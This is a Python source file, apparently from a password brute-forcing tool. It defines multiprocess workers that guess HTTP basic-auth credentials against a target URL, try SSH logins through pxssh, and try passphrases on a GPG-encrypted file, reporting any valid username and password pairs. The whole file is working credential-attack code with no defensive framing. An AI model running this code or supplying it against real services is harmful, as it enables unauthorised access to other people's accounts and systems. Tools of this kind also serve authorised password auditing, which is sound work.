###
###
###

import queue
import pexpect.pxssh as pxssh
import gnupg
import requests

class requestor_http:
	def say(pipo):
		print(pipo)

	def worker(qPass, qRes, qUser, target, session, counter, end, head, t_out, wId):
		"""
		Base method that will be instanciated through multiple process
		This method is responsible for the actual bruteforce job

		param qPass: <Queue> shared queue of passwords
		param qRes: <Queue> share queue of positive results
		param qUser: <string> the user to test (queue not implemented yet)
		param target: <string> the url where the service to bruteforce is
		param counter: <int> shared counter of how many passes have been tried
		param end: <int[]> shared int array, each process store 1 with its id as index when it has finished its job
		param head: <bool> should the GET HEAD technique be used
		param wId: <int> id of the this worker
		"""

		noPass_miss = 0
		noPass_max = 2

		retry = False

		while True:
			try:
				counter.value += 1
				passwd = qPass.get(timeout=1)

				bAuth = (qUser, passwd)

				if(head):
					res = session.head(target, auth=bAuth)
				else:
					res = session.get(target, auth=bAuth)

				if(res.status_code == 200):
					qRes.put("Valid pair: u:{} | p:{}".format(qUser, passwd))

			#except requests.exceptions.ReadTimeout:
			#	print("Timeout reach, consider increasing timeout value")
			#	retry = True

			except queue.Empty:
				#print("Queue Empty")
				noPass_miss += 1
				if(noPass_miss > noPass_max):
					break
				pass

		end[wId] = 1

class requestor_gpg:
	def worker(qPass, qRes, enc_file, counter, end, wId):
		"""
		Base method that will be instanciated through multiple process
		This method is responsible for the actual bruteforce job

		param qPass: <Queue> shared queue of passwords
		param qRes: <Queue> share queue of positive results
		param counter: <int> shared counter of how many passes have been tried
		param end: <int[]> shared int array, each process store 1 with its id as index when it has finished its job
		param enc_file: <string> the encoded file to bruteforce
		param wId: <int> id of the this worker
                """

		gpg = gnupg.GPG()
		with open(enc_file, 'rb') as f:
			while True:
				try:
					passwd = qPass.get(timeout=1)
					status = gpg.decrypt_file(f, passphrase=passwd, output='{}_{}_decrypted'.format(wId, passwd))
					counter.value += 1
					if(status.ok):
						qRes.put("Valid pass: {}".format(passwd))
				except queue.Empty:
					break
		end[wId] = 1

class requestor_ssh:
	def worker(qPass, qRes, qUser, target, counter, end, wId):
		"""
		Base method that will be instanciated through multiple process
		This method is responsible for the actual bruteforce job

		param qPass: <Queue> shared queue of passwords
		param qRes: <Queue> share queue of positive results
		param qUser: <string> the user to test (queue not implemented yet)
		param target: <string> the address where the service to bruteforce is
		param counter: <int> shared counter of how many passes have been tried
		param end: <int[]> shared int array, each process store 1 with its id as index when it has finished its job
		param wId: <int> id of the this worker
		"""

		noPass_miss = 0
		noPass_max = 2

		while True:
			try:
				ssh = pxssh.pxssh()
				passwd = qPass.get(timeout=1)
				counter.value += 1

				if(ssh.login(target, qUser, passwd)):
					qRes.put("Valid pair: u:{} | p:{}".format(qUser, passwd))
					ssh.logout()

			except pxssh.ExceptionPxssh as e:
				if("Could not establish connection" in str(e)):
					print("Too many concurrent process for this service! Reduce process number!")
				pass

			except queue.Empty:
				noPass_miss += 1
				if(noPass_miss > noPass_max):
					break
				pass
		end[wId] = 1

